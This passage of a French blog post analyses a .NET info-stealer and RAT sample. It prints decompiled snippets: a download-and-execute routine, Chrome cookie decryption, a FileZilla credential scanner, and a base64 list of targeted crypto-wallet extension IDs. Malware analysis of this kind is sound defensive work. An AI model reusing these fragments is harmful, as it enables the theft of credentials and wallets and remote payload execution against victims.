+</span></span><span style="display:flex;"><span>      throw new <span style="color:#a6e22e">CryptographicException</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  this.<span style="color:#a6e22e">BCryptDestroyKey</span>(hKey);
+</span></span><span style="display:flex;"><span>  Marshal.<span style="color:#a6e22e">FreeHGlobal</span>(hglobal);
+</span></span><span style="display:flex;"><span>  this.<span style="color:#a6e22e">BCryptCloseAlgorithmProvider</span>(intPtr, <span style="color:#ae81ff">0U</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> array2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Surement un <em>Ransomware</em>  ou juste une fonction pour chiffrer les fichiers de la victime &hellip;</p>
+<p>En cherchant encore plus loin, on trouve des strings très bizarre , celle-ci sont affichées ligne par ligne dans les listes . Comme ceci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>new <span style="color:#a6e22e">string</span>(new <span style="color:#66d9ef">char</span>[]
+</span></span><span style="display:flex;"><span>					{
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;L&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;o&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;g&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;i&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;n&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39; &#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;D&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;a&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;t&#39;</span>,
+</span></span><span style="display:flex;"><span>						<span style="color:#e6db74">&#39;a&#39;</span>
+</span></span><span style="display:flex;"><span>					}),
+</span></span></code></pre></div><p>En cherchant et en jouant avec les listes présentes, j&rsquo;ai trouvé ceci :</p>
+<pre tabindex="0"><code>ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbg=
+</code></pre><p>C&rsquo;est évidemment de la base64 et une fois décodé, on obtient :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet
+</span></span><span style="display:flex;"><span>ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink
+</span></span><span style="display:flex;"><span>jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet
+</span></span><span style="display:flex;"><span>nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask
+</span></span><span style="display:flex;"><span>afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet
+</span></span><span style="display:flex;"><span>hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase
+</span></span><span style="display:flex;"><span>fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain
+</span></span><span style="display:flex;"><span>odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet
+</span></span><span style="display:flex;"><span>hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet
+</span></span><span style="display:flex;"><span>blnieiiffboillknjnepogjhkgnoapac|EqualWallet
+</span></span><span style="display:flex;"><span>cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty
+</span></span><span style="display:flex;"><span>fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet
+</span></span><span style="display:flex;"><span>kncchdigobghenbbaddojjnnaogfppfj|iWallet
+</span></span><span style="display:flex;"><span>amkmjjmmflddogmhpjloimipbofnfjih|Wombat
+</span></span><span style="display:flex;"><span>fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet
+</span></span><span style="display:flex;"><span>nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx
+</span></span><span style="display:flex;"><span>nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet
+</span></span><span style="display:flex;"><span>nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet
+</span></span><span style="display:flex;"><span>fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet
+</span></span><span style="display:flex;"><span>aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation
+</span></span><span style="display:flex;"><span>fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet
+</span></span><span style="display:flex;"><span>aeachknmefphepccionboohckonoeemg|Coin98Wallet
+</span></span><span style="display:flex;"><span>cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal
+</span></span><span style="display:flex;"><span>pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChainbase64
+</span></span></code></pre></div><p>On a aussi, plus loin, des chemins d&rsquo;accès avec par exemple : &lsquo;AppData/Roaming&rsquo;
+Combiné à toutes les class d&rsquo;exécution de commandes comme :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">Process</span>(Entity6 updateTask)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		try
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			string[] array <span style="color:#f92672">=</span> updateTask.Id2.<span style="color:#a6e22e">Split</span>(new string[]
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				<span style="color:#e6db74">&#34;|&#34;</span>
+</span></span><span style="display:flex;"><span>			}, StringSplitOptions.RemoveEmptyEntries);
+</span></span><span style="display:flex;"><span>			new <span style="color:#a6e22e">WebClient</span>().<span style="color:#a6e22e">DownloadFile</span>(array[<span style="color:#ae81ff">0</span>], Environment.<span style="color:#a6e22e">ExpandEnvironmentVariables</span>(array[<span style="color:#ae81ff">1</span>]));
+</span></span><span style="display:flex;"><span>			System.Diagnostics.Process.<span style="color:#a6e22e">Start</span>(new ProcessStartInfo
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				WorkingDirectory <span style="color:#f92672">=</span> new <span style="color:#a6e22e">FileInfo</span>(Environment.<span style="color:#a6e22e">ExpandEnvironmentVariables</span>(array[<span style="color:#ae81ff">1</span>])).Directory.FullName,
+</span></span><span style="display:flex;"><span>				FileName <span style="color:#f92672">=</span> Environment.<span style="color:#a6e22e">ExpandEnvironmentVariables</span>(array[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>			});
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">catch</span> (Exception)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>On comprend que ce n&rsquo;est pas juste un RAT. Il y a aussi une partie du virus qui vole les sessions de certains site de cryptomonnaies en téléchargeant les fichiers locaux des clients Windows .</p>
+<p>Par exemple, plus bas ce trouve une fonction du nom de : <code>ScanPassword</code> avec <code>string chromeKey = EntityCreator.ReadKey(profilePath);</code>. Cette fonction regarde si dans la base de donnée , on retrouve des cookies de connections
+avec ce genre de fonction :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (chiperText[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;v&#39;</span> <span style="color:#f92672">&amp;&amp;</span> chiperText[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		result <span style="color:#f92672">=</span> global<span style="color:#f92672">::</span>Aes.<span style="color:#a6e22e">Decrypt</span>(Convert.<span style="color:#a6e22e">FromBase64String</span>(chromeKey), chiperText);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		result <span style="color:#f92672">=</span> CryptoHelper.<span style="color:#a6e22e">DecryptBlob</span>(chiperText, DataProtectionScope.CurrentUser, null).<span style="color:#a6e22e">Trim</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><pre><code>La class 'FileZilla' évoqué plus tôt fait ceci :
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>private <span style="color:#66d9ef">static</span> List<span style="color:#f92672">&lt;</span>Entity12<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">ScanCredentials</span>(string Path)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		List<span style="color:#f92672">&lt;</span>Entity12<span style="color:#f92672">&gt;</span> list <span style="color:#f92672">=</span> new List<span style="color:#f92672">&lt;</span>Entity12<span style="color:#f92672">&gt;</span>();
+</span></span><span style="display:flex;"><span>		try
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			XmlTextReader reader <span style="color:#f92672">=</span> new <span style="color:#a6e22e">XmlTextReader</span>(Path);
+</span></span><span style="display:flex;"><span>			XmlDocument xmlDocument <span style="color:#f92672">=</span> new <span style="color:#a6e22e">XmlDocument</span>();
+</span></span><span style="display:flex;"><span>			xmlDocument.<span style="color:#a6e22e">Load</span>(reader);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">foreach</span> (object obj in xmlDocument.DocumentElement.ChildNodes[<span style="color:#ae81ff">0</span>].ChildNodes)
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				Entity12 recent <span style="color:#f92672">=</span> FileZilla.<span style="color:#a6e22e">GetRecent</span>((XmlNode)obj);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (recent.Id1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;UNKNOWN&#34;</span> <span style="color:#f92672">&amp;&amp;</span> recent.Id1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;UNKNOWN&#34;</span>)
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					list.<span style="color:#a6e22e">Add</span>(recent);
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		catch
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> list;
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>Elle scan un document XML ou les identifiants sont stockés .
+Il y a la même chose pour voler les tokens discords .</p>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="//localhost:1313/posts/contourner-le-ssl-pinning-sur-android/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Comment contourner le SSL Pinning sur android</a>
+        
+	    
+            <div class="next-post">
+                <a href="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll-2/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Execution de ShellCode grâce au Dll Hidjacking</a>
+            </div>
+        
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#commencement">Commencement</a></li>
+    <li><a href="#analyse-des-fonctions">Analyse des fonctions</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
